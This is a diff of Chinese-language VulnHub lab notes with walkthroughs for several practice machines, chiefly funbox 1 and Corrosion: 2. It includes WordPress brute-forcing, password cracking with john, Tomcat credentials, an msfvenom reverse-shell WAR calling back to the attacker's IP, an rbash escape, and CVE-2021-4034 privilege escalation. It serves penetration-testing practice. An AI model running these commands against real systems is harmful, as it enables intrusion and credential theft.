@@ -1,14 +1,12 @@
-# vulnhub靶场
-
-## MY CMSMS: 1
+# MY CMSMS: 1
 
 > * 信息汇总
->   * ​ 本机ip
+>   *  本机ip
 >     * 10.0.2.11
->   * ​ 靶机ip
+>   *  靶机ip
 >     * 10.0.2.10
 
-### 信息收集：
+信息收集：
 
 ```shell
 nmap -p- -Pn -vv 10.0.2.10
@@ -63,12 +61,12 @@ PORT      STATE SERVICE REASON         VERSION
 
 http://10.0.2.10/
 
-## cengbox
+# cengbox
 
 ```shell
 ```
 
-## cybox
+# cybox
 
 ```shell
 21/tcp  open  ftp      syn-ack ttl 64 vsftpd 3.0.3
@@ -121,3 +119,204 @@ http://10.0.2.10/
 | MD5:   1308 6ffe 0aa0 d469 6464 2d4d dbab dd48
 | SHA-1: 7a0a d33a 9fc1 b469 295b abc6 8157 bf7b 0788 1a93
 ```
+
+
+
+
+
+# funbox 1
+
+**本机ip：**
+
+~~~
+10.0.2.11 
+~~~
+**靶机ip：**
+
+~~~
+10.0.2.15
+~~~
+
+**信息收集：**
+
+端口
+
+> 21/tcp    open  ftp     syn-ack ttl 64
+> 22/tcp    open  ssh     syn-ack ttl 64
+> 80/tcp    open  http    syn-ack ttl 64
+> 33060/tcp open  mysqlx  syn-ack ttl 64
+
+` wpscan --url http://funbox.fritz.box/ --enumerate u --api-token  xxxxxxxxxxxxxxxxxxxxx` 
+
+![image-20220822164625552](vulnhub靶场.assets/image-20220822164625552.png)
+
+`wpscan --url http://funbox.fritz.box/ -P /usr/share/wordlists/rockyou.txt --max-threads 100`
+
+![image-20220822165001558](vulnhub靶场.assets/image-20220822165001558.png)
+
+![image-20220822165412192](vulnhub靶场.assets/image-20220822165412192.png)
+
+![image-20220822170319461](vulnhub靶场.assets/image-20220822170319461.png)
+
+
+
+![image-20220822170336056](vulnhub靶场.assets/image-20220822170336056.png)
+
+
+
+**漏洞利用**：
+
+~~~
+python -c 'import pty;pty.spawn("/bin/bash");'
+~~~
+
+
+
+![image-20220822170913330](vulnhub靶场.assets/image-20220822170913330.png)
+
+
+
+
+
+
+
+**权限提升：**
+
+>  ssh joe@10.0.2.15  
+>
+> password : 12345
+
+`python -c 'import os; os.system("/bin/sh")'` 绕过 rbash
+
+**CVE-2021-4034** 脚本提权
+
+# Corrosion: 2
+
+**本机ip**
+
+~~~
+192.168.59.10
+~~~
+
+**靶机ip**
+
+~~~
+192.168.59.19
+~~~
+
+**信息收集：**
+
+> Discovered open port 22/tcp on 192.168.59.19
+> Discovered open port 8080/tcp on 192.168.59.19
+> Discovered open port 80/tcp on 192.168.59.19
+
+![image-20220823203746351](vulnhub靶场.assets/image-20220823203746351.png)
+
+**backup.zip需要密码**
+
+![image-20220823203903297](vulnhub靶场.assets/image-20220823203903297.png)
+
+**破解密码：**
+
+~~~
+zip2john backup.zip > hash 
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+密码为：@administrator_hi5
+~~~
+
+![image-20220823204145744](vulnhub靶场.assets/image-20220823204145744.png)
+
+~~~
+cat tomcat-users.xml   //  查看tomcat管理密码
+
+<role rolename="manager-gui"/>
+<user username="manager" password="melehifokivai" roles="manager-gui"/>
+
+<role rolename="admin-gui"/>
+<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
+</tomcat-users>
+
+~~~
+
+**登录tomcat后台并部署war木马项目，反弹shell**
+
+![image-20220823204440336](vulnhub靶场.assets/image-20220823204440336.png)
+
+~~~
+#制作反弹shell
+
+msfvenom -p java/jsp_shell_reverse_tcp  LPORT=6666 LHOST=192.168.59.10 -f war > /root/baji/Vulnhub/Corrosion_2/rever.war
+
+
+
+~~~
+
+![image-20220823204929987](vulnhub靶场.assets/image-20220823204929987.png)
+
+
+
+**漏洞利用：**
+
+~~~
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+~~~
+
+**两个用户**
+
+![image-20220823205535789](vulnhub靶场.assets/image-20220823205535789.png)
+
+**尝试使用ssh登录，密码为tomcat的密码**
+
+jaye用户登录成功
+
+jaye没有sudo权限
+
+~~~
+find  / -perm -u=s -type f 2>/dev/null
+~~~
+
+![image-20220823205946568](vulnhub靶场.assets/image-20220823205946568.png)
+
+![image-20220823210029343](vulnhub靶场.assets/image-20220823210029343.png)
+
+
+
+![image-20220823210139811](vulnhub靶场.assets/image-20220823210139811.png)
+
+~~~
+echo  '$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/' > randyhash
+~~~
+
+~~~
+john randyhash --wordlist=/usr/share/wordlists/rockyou.txt 
+~~~
+
+
+
+
+
+
+
+
+
+
+
+
+
+**权限提升：**
+
+**上传linpeas.sh脚本**
+
+![image-20220823212205858](vulnhub靶场.assets/image-20220823212205858.png)
+
+https://github.com/berdav/CVE-2021-4034
+
+直接脚本提权成功
+
+
+
+
+
+CVE-2022-0847脚本执行失败
+
+>  /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found 
